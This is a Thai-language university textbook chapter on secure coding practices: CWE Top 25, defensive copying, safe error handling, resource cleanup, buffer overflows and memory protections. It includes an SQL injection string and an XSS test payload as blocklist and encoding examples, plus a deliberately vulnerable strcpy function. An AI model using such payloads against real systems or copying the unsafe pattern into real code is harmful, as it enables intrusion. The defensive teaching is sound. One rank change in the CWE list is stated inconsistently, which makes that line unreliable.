# CH-9: Secure Coding Practices


---

## วัตถุประสงค์การเรียนรู้

เมื่อจบบทนี้นักศึกษาสามารถ:

1. เข้าใจหลักการเขียนโปรแกรมที่ปลอดภัยตามมาตรฐาน OWASP, CERT/SEI, และ CWE Top 25
2. ใช้เทคนิค Defensive Programming รวมถึง Immutable Objects, Defensive Copying, Fail Safe และ Fail Fast
3. จัดการ Error และ Exception อย่างปลอดภัยโดยไม่รั่วไหลข้อมูลสำคัญ
4. อธิบายและป้องกัน Buffer Overflow, Use-after-Free, และ Format String Vulnerabilities
5. จัดการ File Upload และ Resource Management อย่างปลอดภัย ป้องกัน Path Traversal และ TOCTOU Race Condition
6. เขียน Log ที่ปลอดภัย ไม่รั่วไหลรหัสผ่าน, Secrets, หรือ PII
7. ใช้ Memory-safe Practices และ Language Features เพื่อป้องกันช่องโหว่ระดับหน่วยความจำ
8. ใช้ SAST Tools (Semgrep, CodeQL) ในการตรวจจับ Secure Coding Violations

---

## ขอบเขตและข้อกำหนดด้านจริยธรรมของบทนี้

บทนี้ครอบคลุมแนวปฏิบัติการเขียนโค้ดที่ปลอดภัย (Secure Coding Practices) เพื่อป้องกันช่องโหว่ในซอฟต์แวร์ เนื้อหามีตัวอย่างโค้ดที่มีช่องโหว่และการแก้ไขเพื่อการศึกษาเท่านั้น กิจกรรมปฏิบัติการทั้งหมดต้องทำในสภาพแวดล้อมที่ได้รับอนุญาต เช่น เครื่องของนักศึกษาเอง เซิร์ฟเวอร์ทดลอง หรือแอปพลิเคชันตัวอย่างที่อาจารย์จัดให้เท่านั้น ห้ามนำเทคนิคในบทนี้ไปใช้กับระบบของบุคคลอื่นหรือระบบที่ไม่ได้รับอนุญาตเป็นลายลักษณ์อักษรโดยเด็ดขาด

**ข้อควรจำ:** การเขียนโค้ดที่ปลอดภัยเป็นหน้าที่ของนักพัฒนาทุกคน ไม่ใช่แค่ทีมความปลอดภัย — ช่องโหว่ส่วนใหญ่มีต้นเหตุจากการเขียนโค้ดโดยไม่คำนึงถึงความปลอดภัย

---

## แผนการเรียนรู้สำหรับ 5 ชั่วโมง

| ช่วงเวลา | หัวข้อ | เป้าหมายการเรียนรู้ | กิจกรรมในชั้นเรียน |
|----------|--------|----------------------|----------------------|
| ชั่วโมงที่ 1 | Defensive Programming และ Secure Coding Standards | เข้าใจหลักการเขียนโค้ดป้องกัน และมาตรฐาน OWASP/CERT/CWE Top 25 | เปรียบเทียบ Fail Fast กับ Fail Safe และวิเคราะห์ตัวอย่าง Defensive Copying |
| ชั่วโมงที่ 2 | การจัดการ Error และ Exception อย่างปลอดภัย | เข้าใจการออกแบบ Error Handler, Global Handler, และ Error Messages ที่ไม่รั่วไหลข้อมูล | วิเคราะห์ตัวอย่าง Stack Trace ที่รั่วไหลข้อมูลสำคัญและออกแบบ Custom Error Page |
| ชั่วโมงที่ 3 | Memory Safety และ Buffer Overflow | เข้าใจ Buffer Overflow, Stack Canary, ASLR, และ Format String Attacks | ทดลอง Buffer Overflow ในสภาพแวดล้อม Sandbox และวิเคราะห์ Memory-safe Languages |
| ชั่วโมงที่ 4 | Secure File และ Resource Management | เข้าใจ Path Traversal, File Upload, TOCTOU | ตรวจสอบ File Upload Validation และเขียนโค้ดป้องกัน TOCTOU |
| ชั่วโมงที่ 5 | Lab 9.1 — 9.4 | ฝึก Code Review, SAST Scanning, File Upload Security และ Exception Handling | ใช้ Semgrep, จัดการ File Upload, และเขียน Global Error Handler |

---

## เนื้อหา

### 9.1 Defensive Programming

Defensive Programming (การเขียนโปรแกรมเชิงป้องกัน) เป็นแนวคิดที่นักพัฒนาต้องเขียนโค้ดโดยสมมติว่าสิ่งที่ผิดพลาดได้จะผิดพลาดเสมอ (Murphy's Law) — ข้อมูลนำเข้าอาจไม่ถูกต้อง ฟังก์ชันอาจล้มเหลว และผู้ใช้หรือผู้โจมตีพยายามทำให้ระบบทำงานผิดปกติ

#### 9.1.1 Secure Coding Standards และกรอบอ้างอิง

มาตรฐานการเขียนโค้ดที่ปลอดภัยมีหลายกรอบอ้างอิงที่นักพัฒนาควรรู้จัก:

| มาตรฐาน | องค์กร | รายละเอียด |
|---------|--------|-----------|
| **OWASP Developer Guide** (เดิม OWASP Secure Coding Practices — ถูก Archive แล้ว) | OWASP | แนวทางปฏิบัติสำหรับเขียนโค้ดปลอดภัย ปัจจุบันรวมอยู่ใน OWASP Developer Guide |
| **CERT Secure Coding Standards** | CERT/SEI (Carnegie Mellon) | มาตรฐานสำหรับ C, C++, Java, Perl — ระบุช่องโหว่และแนวทางแก้ไข |
| **CWE Top 25 Most Dangerous Software Weaknesses** | MITRE | รายการจุดอ่อนซอฟต์แวร์ที่อันตรายที่สุด 25 อันดับ |
| **NIST SP 800-218 (SSDF)** | NIST | Secure Software Development Framework — แนวทางปฏิบัติสำหรับ Secure SDLC |
| **SEI CERT Oracle Coding Standard for Java** | CERT/SEI | มาตรฐาน Secure Coding สำหรับ Java โดยเฉพาะ |
| **MISRA** | MISRA Consortium | มาตรฐานสำหรับระบบ Embedded และ Automotive (C/C++) |

**CWE Top 25 (2025) ที่เกี่ยวข้องกับ Secure Coding:**

| อันดับ | CWE ID | ชื่อ | ความเกี่ยวข้อง |
|:-----:|:------:|------|--------------|
| 1 | CWE-79 | Cross-site Scripting (XSS) | Output Encoding |
| 2 | CWE-89 | SQL Injection | Input Validation |
| 3 | CWE-352 | Cross-Site Request Forgery | Session Management |
| 4 | CWE-862 | Missing Authorization | Access Control |
| 5 | CWE-787 | Out-of-bounds Write | Memory Safety — Buffer Overflow |
| 6 | CWE-22 | Path Traversal | File Management |
| 7 | CWE-416 | Use After Free | Memory Safety |
| 8 | CWE-125 | Out-of-bounds Read | Memory Safety |
| 9 | CWE-78 | OS Command Injection | Input Validation |
| 10 | CWE-94 | Code Injection | Input Validation |
| 11 | CWE-120 | Classic Buffer Overflow | Memory Safety |
| 12 | CWE-434 | Unrestricted File Upload | File Management |
| 13 | CWE-476 | NULL Pointer Dereference | Error Handling |
| 14 | CWE-121 | Stack-based Buffer Overflow | Memory Safety |
| 15 | CWE-502 | Deserialization of Untrusted Data | Input Validation |
| 16 | CWE-122 | Heap-based Buffer Overflow | Memory Safety |
| 17 | CWE-863 | Incorrect Authorization | Access Control |
| 18 | CWE-20 | Improper Input Validation | Input Validation |
| 19 | CWE-284 | Improper Access Control | Access Control |
| 20 | CWE-200 | Exposure of Sensitive Information | Error Handling / Logging |
| 21 | CWE-306 | Missing Authentication | Authentication |
| 22 | CWE-918 | Server-Side Request Forgery | Input Validation |
| 23 | CWE-77 | Command Injection | Input Validation |
| 24 | CWE-639 | Authorization Bypass Through User-Controlled Key | Access Control |
| 25 | CWE-770 | Allocation Without Limits/Throttling | Resource Management |

**การเปลี่ยนแปลงสำคัญจาก CWE Top 25 2024 สู่ 2025:**
- CWE-352 (CSRF) พุ่งขึ้นจากอันดับ 9 → 3
- CWE-862 (Missing Authorization) พุ่งขึ้นจากอันดับ 16 → 4
- CWE-20 (Improper Input Validation) ร่วงจากอันดับ 6 → 18
- CWE-476 (NULL Pointer Dereference) พุ่งขึ้นจากอันดับ 11 → 13
- **รายการใหม่**: CWE-120 (Classic Buffer Overflow), CWE-121 (Stack-based BOF), CWE-122 (Heap-based BOF), CWE-284 (Improper Access Control), CWE-639 (Authorization Bypass), CWE-770 (Allocation Without Limits)
- **รายการที่หลุด**: CWE-190 (Integer Overflow), CWE-287 (Improper Authentication), CWE-798 (Hard-coded Credentials), CWE-119 (Buffer Overflow — ถูกแยกย่อย), CWE-276 (Incorrect Default Permissions), CWE-362 (Race Condition), CWE-400 (Resource Exhaustion), CWE-611 (XXE)

#### 9.1.2 Input Sanitization และ Output Encoding (ทบทวน)

จากบทที่ 5 Input Validation และ Injection Attacks การ Sanitize ข้อมูลนำเข้าและ Encode ข้อมูลส่งออกเป็นแนวปฏิบัติสำคัญที่สุดในการป้องกัน Injection Attacks

**หลักการสำคัญ — Trust Boundary:**

```text
ข้อมูลจากผู้ใช้ → [Trust Boundary] → ระบบของเรา
```

ทุกอย่างที่อยู่หน้า Trust Boundary (User Input, Third-party API, File Upload, Database) ต้องถูกตรวจสอบก่อนนำไปใช้

**แนวทางปฏิบัติ:**

| แนวทาง | คำอธิบาย | ตัวอย่าง |
|--------|----------|---------|
| **Allowlist Validation** | อนุญาตเฉพาะค่าที่กำหนดไว้ล่วงหน้า | `^[a-zA-Z0-9_]{3,20}$` |
| **Blocklist Validation** | ปิดกั้นค่าที่ไม่ต้องการ | กรอง `<script>`, `' OR 1=1 --` |
| **Sanitization** | ลบหรือแก้ไขข้อมูลอันตราย | ลบแท็ก HTML, Escape Special Characters |
| **Output Encoding** | แปลงข้อมูลก่อนแสดงผลตาม Context | HTML Encode, URL Encode, JavaScript Encode |

**ตัวอย่าง Context-aware Output Encoding:**

```python
import html

user_input = '<script>alert("XSS")</script>'
safe_output = html.escape(user_input, quote=True)
# Output: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
```

| Context | Encoding Method | ตัวอย่าง |
|---------|----------------|----------|
| HTML Body | HTML Entity Encoding | `&` → `&amp;`, `<` → `&lt;` |
| HTML Attribute | HTML Attribute Encoding | `"` → `&quot;` |
| JavaScript | JavaScript Unicode Escaping | `'` → `\x27`, `"` → `\x22` |
| URL | URL Encoding (Percent Encoding) | `<space>` → `%20` |
| CSS | CSS Escaping | special chars → `\XX` |

#### 9.1.3 Immutable Objects และ Defensive Copying

**Immutable Objects:**

Immutable Object คือ Object ที่ไม่สามารถเปลี่ยนแปลงสถานะได้หลังจากถูกสร้างขึ้น — ทุกครั้งที่ต้องการ "เปลี่ยนแปลง" จะสร้าง Object ใหม่แทน

```python
# Mutable — ไม่ปลอดภัย
class User:
    def __init__(self, name, roles):
        self.name = name
        self.roles = roles  # list — สามารถแก้ไขได้จากภายนอก

# Immutable — ปลอดภัยกว่า
class User:
    def __init__(self, name, roles):
        self._name = name
        self._roles = tuple(roles)  # tuple — ไม่สามารถแก้ไขได้
    
    @property
    def name(self):
        return self._name
    
    @property
    def roles(self):
        return self._roles  # คืนค่า tuple — caller แก้ไขไม่ได้
```

```java
// Java: Immutable Class
public final class User {
    private final String name;
    private final List<String> roles;
    
    public User(String name, List<String> roles) {
        this.name = name;
        this.roles = new ArrayList<>(roles); // Defensive Copy
    }
    
    public String getName() { return name; }
    
    public List<String> getRoles() {
        return Collections.unmodifiableList(roles); // Unmodifiable view
    }
}
```

**Defensive Copying:**

Defensive Copying คือการทำสำเนาข้อมูลก่อนนำไปใช้หรือจัดเก็บ เพื่อป้องกันการแก้ไขจากภายนอก

```java
// ไม่ปลอดภัย: ไม่มี Defensive Copy
public class BankAccount {
    private byte[] accountNumber;
    
    public void setAccountNumber(byte[] accountNumber) {
        this.accountNumber = accountNumber; // caller มี Reference → แก้ไขได้
    }
    
    public byte[] getAccountNumber() {
        return this.accountNumber; // caller ได้ Reference → แก้ไขข้อมูลภายในได้
    }
}

// ปลอดภัย: มี Defensive Copy
public class BankAccount {
    private byte[] accountNumber;
    
    public void setAccountNumber(byte[] accountNumber) {
        this.accountNumber = Arrays.copyOf(accountNumber, accountNumber.length);
    }
    
    public byte[] getAccountNumber() {
        return Arrays.copyOf(this.accountNumber, this.accountNumber.length);
    }
}
```

**แนวทางปฏิบัติสำหรับ Defensive Copying:**

| สถานการณ์ | แนวทาง |
|-----------|--------|
| Constructor Parameter | ทำสำเนาก่อนเก็บใน Field |
| Getter Method | คืนค่าเป็น Clone/Copy |
| Setter Method | ทำสำเนาก่อน Assign |
| Return Collection | คืนค่าเป็น Unmodifiable View หรือ Copy |
| Accept Array/Collection | ทำสำเนาก่อนใช้งาน |

#### 9.1.4 Fail Fast vs Fail Safe

สองแนวคิดนี้มีความหมายต่างกันในบริบทของ Secure Coding:

| คุณสมบัติ | Fail Fast | Fail Safe |
|-----------|-----------|-----------|
| **หลักการ** | หยุดทำงานทันทีเมื่อพบข้อผิดพลาด | เมื่อผิดพลาด ให้กลับสู่สถานะที่ปลอดภัยที่สุด |
| **ข้อดี** | ตรวจจับ Bug ได้เร็ว ไม่ปิดบังปัญหา | ระบบยังทำงานต่อได้ในโหมดจำกัด |
| **ข้อเสีย** | อาจทำให้ระบบ Downtime | Bug อาจถูกซ่อนไว้ |
| **เหมาะกับ** | Development, Testing, Debugging | Production, Safety-critical Systems |
| **ตัวอย่าง** | Exception ที่ไม่ควร Catch แบบเงียบ | ถ้า Authentication System ล้ม → Deny All Access |

**ตัวอย่าง Fail Fast:**

```python
def divide_numbers(a, b):
    if b == 0:
        raise ValueError("Division by zero — fail fast")
    return a / b

def process_payment(amount, account):
    if amount <= 0:
        raise ValueError("Invalid payment amount")
    if account is None or not account.is_active:
        raise ValueError("Invalid or inactive account")
    # ถ้าผ่านทั้งสอง Check → ดำเนินการต่อ
```

**ตัวอย่าง Fail Safe (ในบริบทความปลอดภัย):**

```python
def check_access(user, resource):
    try:
        # ถ้า Authorization Service ล้ม → Deny Access (Fail Safe)
        return authorization_service.check_permission(user, resource)
    except AuthorizationServiceTimeout:
        log_error("Authorization service unavailable — denying access by default")
        return False  # ปฏิเสธการเข้าถึงเป็นค่าเริ่มต้น
    except Exception as e:
        log_error(f"Unexpected authorization error: {e}")
        return False  # Fail Safe — ปฏิเสธทุกอย่างเมื่อไม่แน่ใจ
```

**ข้อควรจำ:** ในบริบทความปลอดภัย Fail Safe มักหมายถึง "Deny by Default" — เมื่อระบบไม่แน่ใจ ให้ปฏิเสธก่อน ไม่ใช่ยอมรับก่อน

#### 9.1.5 Integer Overflow และ Type Safety

Integer Overflow เกิดจากการคำนวณที่ผลลัพธ์เกินค่าที่ประเภทข้อมูลนั้นรองรับ

```c
// C — Integer Overflow ปัญหาที่พบได้บ่อย
#include <stdio.h>

int main() {
    unsigned char small = 255;  // unsigned char: 0-255
    small = small + 1;          // overflow → 0
    printf("%d\n", small);      // Output: 0
    
    signed char small_signed = 127;  // signed char: -128 to 127
    small_signed = small_signed + 1; // overflow → -128
    printf("%d\n", small_signed);    // Output: -128
    
    return 0;
}
```

```python
# Python — ไม่มี Integer Overflow (Unbounded)
# แต่ต้องระวังในภาษาอื่น
```

```java
// Java — ต้องป้องกัน Integer Overflow ด้วยตัวเอง
public class SafeMath {
    public static int safeAdd(int a, int b) throws ArithmeticException {
        if (b > 0 && a > Integer.MAX_VALUE - b) {
            throw new ArithmeticException("Integer overflow detected");
        }
        if (b < 0 && a < Integer.MIN_VALUE - b) {
            throw new ArithmeticException("Integer underflow detected");
        }
        return a + b;
    }
}
```

**ภาษาและความปลอดภัยด้าน Type:**

| ภาษา | Type Safety | Integer Overflow | Memory Safety | คำแนะนำ |
|------|:----------:|:----------------:|:-------------:|---------|
| **Python** | Dynamic | ไม่มี (Unbounded) | Safe | เหมาะสำหรับ Prototype |
| **Java** | Static, Strong | มี (ต้องป้องกันเอง) | Safe (JVM) | ใช้ `Math.addExact()` |
| **C#** | Static, Strong | มี (checked/unchecked) | Safe (.NET) | ใช้ `checked` block |
| **Rust** | Static, Strong | Debug=Panic, Release=Wrapping | Safe (Ownership) | ใช้ `.checked_add()` |
| **C/C++** | Static, Weak | **มี — Undefined Behavior** | **ไม่ Safe** | ใช้ Compiler Warnings, Safe Libs |
| **Go** | Static, Strong | มี (Wrap Around) | Safe (GC) | ใช้ `math/bits` |
| **TypeScript** | Static, Dynamic | มี (JS Number 64-bit) | Safe (JS Engine) | ใช้ BigInt |

---

### 9.2 การจัดการ Error และ Exception อย่างปลอดภัย

การจัดการ Error และ Exception ที่ปลอดภัยมีความสำคัญไม่แพ้การเขียน Logic ที่ถูกต้อง — Error Handler ที่ไม่ปลอดภัยสามารถรั่วไหลข้อมูลสำคัญ หรือเปิดช่องโหว่ให้ผู้โจมตีใช้ในการโจมตีระบบ

#### 9.2.1 หลักการจัดการ Exception ที่ปลอดภัย

**หลักการสำคัญ:**

1. **ไม่เปิดเผย Internal Information** — Stack Trace, File Paths, DB Schema, IP Addresses ต้องไม่รั่วไหลไปยังผู้ใช้
2. **ไม่ Catch Exception แบบเงียบ** — การใช้ `except: pass` (Python) หรือ `catch(Exception){}` (Java) ปิดบังข้อผิดพลาด
3. **Fail Safe สำหรับ Security Exceptions** — ถ้า Security Component ล้ม ให้ Deny Access
4. **Centralized Error Handling** — ใช้ Global Handler แทนการ Try-Catch กระจายทั่วโค้ด
5. **Log Appropriate Detail** — Log รายละเอียดสำหรับ Admin แต่ User-facing Message ต้องปลอดภัย

```python
# ไม่ปลอดภัย: แสดง Stack Trace ให้ผู้ใช้เห็น
try:
    result = process_data(user_input)
except Exception as e:
    print(f"Error occurred: {e}")
    print(traceback.format_exc())  # Stack Trace รั่วไหล!

# ปลอดภัย: Log รายละเอียดใน Server, แสดงข้อความทั่วไปให้ผู้ใช้
import logging
logger = logging.getLogger(__name__)

try:
    result = process_data(user_input)
except ValueError as e:
    logger.warning(f"Validation error: {e}")  # Log รายละเอียด
    return {"error": "ข้อมูลที่ส่งมาไม่ถูกต้อง"}, 400  # ข้อความทั่วไป
except Exception as e:
    logger.error(f"Unexpected error: {e}", exc_info=True)  # Log Stack Trace
    return {"error": "เกิดข้อผิดพลาดภายในระบบ กรุณาลองใหม่อีกครั้ง"}, 500
```

#### 9.2.2 ข้อมูลใน Error Messages — สิ่งที่ห้ามเปิดเผย

| ข้อมูลที่ห้ามแสดง | เหตุผล | ตัวอย่างอันตราย |
|------------------|--------|----------------|
| **Stack Trace** | เปิดเผยโครงสร้างโค้ด, Library Version, File Paths | `at com.myapp.dao.UserDao.getUser(UserDao.java:42)` |
| **Database Schema** | ช่วยผู้โจมตีวางแผน SQL Injection | `Table 'users' doesn't exist` |
| **File Paths** | เปิดเผยโครงสร้าง Directory | `/var/www/html/app/config/database.php` |
| **Internal IP** | เปิดเผยโครงสร้างเครือข่าย | `10.0.1.5:5432` |
| **Library Version** | เปิดเผย Known Vulnerabilities | `Tomcat 8.5.12 — CVE-2023-1234` |
| **Session/Token** | เปิดเผย Session ที่ใช้อยู่ | `Token: eyJhbGciOi...` |
| **System Configuration** | เปิดเผยค่าที่ใช้ Debug | `DEBUG=True` |

**ตัวอย่างการจัดการ Error Messages ที่ถูกต้อง:**

```java
// ไม่ปลอดภัย: Spring Boot Default Error
@GetMapping("/user/{id}")
public User getUser(@PathVariable String id) {
    return userRepository.findById(id).orElseThrow(
        () -> new RuntimeException("User not found with id: " + id)
    );
}

// ปลอดภัย: Custom Error Response
@GetMapping("/user/{id}")
public ResponseEntity<?> getUser(@PathVariable String id) {
    try {
        User user = userRepository.findById(id)
            .orElseThrow(() -> new ResourceNotFoundException("User not found"));
        return ResponseEntity.ok(user);
    } catch (ResourceNotFoundException e) {
        log.warn("Resource not found: userId={}", id);  // Log Detail
        return ResponseEntity.status(404).body(
            new ErrorResponse("ไม่พบผู้ใช้ที่ระบุ")  // Generic Message
        );
    } catch (Exception e) {
        log.error("Unexpected error fetching user: userId={}", id, e);
        return ResponseEntity.status(500).body(
            new ErrorResponse("เกิดข้อผิดพลาดภายในระบบ กรุณาลองใหม่อีกครั้ง")
        );
    }
}
```

#### 9.2.3 Global Error Handler

Global Error Handler เป็นตัวจัดการ Exception ส่วนกลางที่ Catch Exception ทั้งหมดที่ไม่มี Handler เฉพาะ ช่วยป้องกันไม่ให้ Exception ที่ไม่คาดคิดรั่วไหลข้อมูลไปยังผู้ใช้

```python
# Flask — Global Error Handler
import logging
from flask import Flask, jsonify

app = Flask(__name__)
logger = logging.getLogger(__name__)

@app.errorhandler(400)
def bad_request(error):
    logger.warning(f"Bad request: {error}")
    return jsonify({"error": "คำขอไม่ถูกต้อง"}), 400

@app.errorhandler(401)
def unauthorized(error):
    logger.warning(f"Unauthorized access attempt")
    return jsonify({"error": "กรุณาล็อกอินก่อนเข้าใช้งาน"}), 401

@app.errorhandler(403)
def forbidden(error):
    logger.warning(f"Forbidden access: {error}")
    return jsonify({"error": "คุณไม่มีสิทธิ์เข้าถึงหน้านี้"}), 403

@app.errorhandler(404)
def not_found(error):
    logger.info(f"Resource not found: {error}")
    return jsonify({"error": "ไม่พบหน้าที่คุณต้องการ"}), 404

@app.errorhandler(500)
def internal_error(error):
    logger.error(f"Internal server error", exc_info=True)
    return jsonify({"error": "เกิดข้อผิดพลาดภายในระบบ"}), 500
```

```javascript
// Express.js — Global Error Handler Middleware
const express = require('express');
const app = express();

// Error Handling Middleware (ต้องเป็น 4 parameters)
app.use((err, req, res, next) => {
    console.error(`[${new Date().toISOString()}] Error:`, err);
    
    // กำหนด Status Code
    const statusCode = err.statusCode || 500;
    const message = err.isOperational 
        ? err.message 
        : 'เกิดข้อผิดพลาดภายในระบบ กรุณาลองใหม่อีกครั้ง';
    
    // Log for internal tracking
    if (statusCode >= 500) {
        console.error('Stack trace:', err.stack);
    }
    
    res.status(statusCode).json({
        error: message,
        requestId: req.id  // สำหรับติดตามโดยไม่เปิดเผยข้อมูล
    });
});
```

#### 9.2.4 Custom Error Pages

Custom Error Pages มีความสำคัญในเว็บแอปพลิเคชัน — ต้องไม่แสดง Stack Trace หรือ Default Server Error Page

```nginx
# NGINX — Custom Error Pages
error_page 404 /404.html;
error_page 500 502 503 504 /50x.html;

location = /404.html {
    root /var/www/html/errors;
    internal;  # ป้องกันการเข้าถึงโดยตรง
}

location = /50x.html {
    root /var/www/html/errors;
    internal;
}
```

```python
# Django — Custom Error Views
# views.py
def handler404(request, exception):
    return render(request, 'errors/404.html', status=404)

def handler500(request):
    return render(request, 'errors/500.html', status=500)

# urls.py
handler404 = 'myapp.views.handler404'
handler500 = 'myapp.views.handler500'
```

**สิ่งที่ Custom Error Page ควรมี:**

| รายการ | คำอธิบาย |
|--------|----------|
| ข้อความที่เข้าใจง่าย | บอกว่าเกิดอะไรขึ้นโดยไม่ใช้ Technical Jargon |
| ข้อมูลติดต่อ | วิธีแจ้งผู้ดูแลระบบ |
| Request/Reference ID | สำหรับให้ Support Team สืบค้น |
| กลับไปหน้าแรก | Link หรือ Button กลับหน้าแรก |
| Timer/Retry | สำหรับ 503/504 — บอกให้ลองใหม่ภายหลัง |

**สิ่งที่ Custom Error Page ห้ามมี:**

- Stack Trace หรือ Error Code ภายใน
- File Paths หรือ System Information
- Database Queries หรือ Table Names
- Version Numbers
- Debug Information

#### 9.2.5 Unhandled Exception และ Resource Leak

Unhandled Exception ที่ไม่ถูก Catch อย่างถูกต้องอาจทำให้:
1. ระบบหยุดทำงาน (Application Crash)
2. หน่วยความจำรั่วไหล (Resource Leak)
3. ข้อมูลไม่ถูกบันทึก (Data Loss)
4. การเชื่อมต่อ Database/File ถูกทิ้งไว้ (Connection Leak)

**แนวทางป้องกัน Resource Leak:**

```java
// ไม่ปลอดภัย: Resource อาจไม่ถูกปิดเมื่อเกิด Exception
public void readFile(String path) throws IOException {
    FileInputStream fis = new FileInputStream(path);
    BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
    String line = reader.readLine();
    // ถ้า reader.readLine() throws → fis และ reader ไม่ถูกปิด
    reader.close();
    fis.close();
}

// ปลอดภัย: Try-with-Resources (Java 7+)
public void readFile(String path) throws IOException {
    try (FileInputStream fis = new FileInputStream(path);
         BufferedReader reader = new BufferedReader(new InputStreamReader(fis))) {
        String line = reader.readLine();
        // Auto-closed — แม้จะเกิด Exception
    }
}
```

```python
# Python: Context Manager
def read_file(path):
    with open(path, 'r') as f:  # with statement — ปิดไฟล์อัตโนมัติ
        content = f.read()
    return content

# หรือใช้ try-finally
def read_file_safe(path):
    f = None
    try:
        f = open(path, 'r')
        return f.read()
    finally:
        if f:
            f.close()
```

**แนวทางรวม: Secure Error Handling Checklist**

| หัวข้อ | แนวทาง |
|--------|--------|
| Stack Trace | ห้ามแสดงให้ผู้ใช้เห็น — Log ใน Server |
| Error Message | ใช้ข้อความทั่วไปกับผู้ใช้ — รายละเอียดใน Log |
| Resource Cleanup | ใช้ try-with-resources / with / finally |
| Global Handler | มี Central Error Handler สำหรับ Exception ที่ไม่คาดคิด |
| Logging | Log Error พร้อม Context แต่ไม่ Log Secrets |
| Custom Error Page | สร้าง 404, 500, 403 Page ที่ปลอดภัยและสวยงาม |

---

### 9.3 Memory Safety

Memory Safety เป็นหนึ่งในประเด็นสำคัญที่สุดของ Secure Coding — ภาษาที่ไม่ Safe ทางหน่วยความจำ (C/C++) เป็นต้นเหตุของช่องโหว่ร้ายแรงจำนวนมาก

#### 9.3.1 Buffer Overflow — หลักการและผลกระทบ

Buffer Overflow เกิดจากการเขียนข้อมูลเกินขนาดของ Buffer ที่จองไว้ในหน่วยความจำ ทำให้ข้อมูลเขียนทับพื้นที่ Memory ข้างเคียง

```c
// C — Buffer Overflow ที่อันตราย
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];  // จอง Buffer ขนาด 64 bytes
    strcpy(buffer, input);  // ไม่ตรวจสอบขนาด — ถ้า input > 64 → Overflow!
    printf("Buffer content: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);  // ส่ง argument ที่ยาวเกิน 64 ตัว
    }
    return 0;
}
```

**ผลกระทบของ Buffer Overflow:**

| ผลกระทบ | คำอธิบาย |
|---------|----------|
| **Crash (Segmentation Fault)** | เขียนทับ Memory ที่สำคัญ → โปรแกรมหยุดทำงาน |
| **Code Execution** | เขียนทับ Return Address → ควบคุม Program Flow → รันโค้ดผู้โจมตี |
| **Information Disclosure** | อ่าน Memory ที่อยู่ติดกัน → ขโมยข้อมูล |
| **Privilege Escalation** | ยกระดับสิทธิ์โดยควบคุม Execution Flow |

**เหตุการณ์สำคัญจาก Buffer Overflow:**

| เหตุการณ์ | ปี | รายละเอียด |
|-----------|-----|-----------|
| **Morris Worm** | 1988 | ใช้ Buffer Overflow ใน `fingerd` — หนอนตัวแรกบนอินเทอร์เน็ต |
| **Code Red** | 2001 | ใช้ Buffer Overflow ใน Microsoft IIS — ติดเซิร์ฟเวอร์กว่า 350,000 เครื่อง |
| **Slammer Worm** | 2003 | ใช้ Buffer Overflow ใน Microsoft SQL Server — โจมตี 75,000 เครื่องใน 10 นาที |
| **Heartbleed** | 2014 | Buffer Over-read ใน OpenSSL — อ่าน Memory Server ครั้งละ 64 KB |
| **WannaCry** | 2017 | ใช้ EternalBlue — Buffer Overflow ใน SMB Protocol |

#### 9.3.2 Memory Protection Mechanisms

ระบบปฏิบัติการสมัยใหม่มีกลไกป้องกัน Memory Safety หลายชั้น:

| กลไก | คำอธิบาย | ป้องกันอะไร |
|------|----------|------------|
| **Stack Canary** | ค่า Sentinel ที่วางไว้ระหว่าง Local Variables และ Return Address — ขนาด 4 bytes (32-bit) หรือ 8 bytes (64-bit, byte แรกเป็น 0 ป้องกัน string overflow) | ป้องกัน Stack Buffer Overflow ที่เขียนทับ Return Address |
| **ASLR** (Address Space Layout Randomization) | สุ่มตำแหน่งหน่วยความจำที่โหลด Library, Stack, Heap | ป้องกันการคาดเดาที่อยู่ (Return-to-libc, ROP) |
| **DEP/NX** (Data Execution Prevention) | ทำเครื่องหมาย Memory Pages ว่าไม่สามารถ Execute ได้ | ป้องกันการรันโค้ดจาก Stack/Heap |
| **CFG** (Control Flow Guard) | ตรวจสอบว่า Indirect Call ไปยัง Target ที่อนุญาตเท่านั้น | ป้องกัน ROP/JOP Attacks |
| **SSP** (Stack Smashing Protection) | GCC Extension — ใส่ Stack Canary อัตโนมัติ | ป้องกัน Stack Buffer Overflow |
| **ASan** (Address Sanitizer) | Compiler Instrumentation — ตรวจจับ Memory Errors ขณะ Runtime | ตรวจจับ Use-after-free, Heap Overflow, Stack Overflow |

**ตัวอย่าง Stack Canary ใน C (GCC):**

```c
// Compile with: gcc -fstack-protector-strong -o safe safe.c
// -fstack-protector-strong: ใส่ Stack Canary สำหรับฟังก์ชันที่มี Local Arrays

#include <stdio.h>
#include <string.h>

void safe_function(char *input) {
    char buffer[64];
    // GCC จะวาง Stack Canary (random value) ไว้ที่นี่
    // ระหว่าง buffer และ frame pointer / return address
    
    strcpy(buffer, input);  // ถ้า overflow → เขียนทับ Canary
    
    // ก่อน return, GCC ตรวจสอบ Canary
    // ถ้า Canary เปลี่ยน → __stack_chk_fail() → abort()
}
```

**การตรวจสอบ Memory Protection ใน Linux:**

```bash
# ตรวจสอบ ASLR
cat /proc/sys/kernel/randomize_va_space
# 0 = Disabled, 1 = Partial, 2 = Full

# ตรวจสอบ DEP/NX บน Binary
gcc -o check check.c
execstack -q ./check  # X แสดงว่ามี Stack Execute

# ตรวจสอบ PIE (Position Independent Executable)
gcc -fpie -pie -o pie_example pie_example.c
```

#### 9.3.3 Memory-safe Languages

ภาษาที่ปลอดภัยทางหน่วยความจำ (Memory-safe Languages) ป้องกัน Buffer Overflow, Use-after-free, และ Memory Corruption โดย Design — ไม่ต้องพึ่งพา Programmer Discipline เพียงอย่างเดียว

| ภาษา | Memory Model | Garbage Collection | Ownership | เหมาะกับ |
|------|:------------:|:------------------:|:---------:|---------|
| **Rust** | Ownership + Borrowing | ไม่ (Zero-cost) | Compile-time | System Programming, Crypto, Browser Engine |
| **Go** | GC + Bounds Check | มี | Runtime | Backend Services, Cloud/DevOps Tools |
| **Java** | JVM + Bounds Check | มี (JVM GC) | Runtime | Enterprise Applications, Android |
| **C#** | .NET + Bounds Check | มี (.NET GC) | Runtime | Windows Apps, Game Dev (Unity) |
| **Python** | Dynamic + Bounds Check | มี (Reference Counting + GC) | Runtime | Scripting, Data Science, Web |
| **JavaScript** | Dynamic + Bounds Check | มี (V8 GC) | Runtime | Web, Node.js |
| **Swift** | ARC (Automatic Reference Counting) | ARC | Compile-time + Runtime | iOS/macOS Apps |
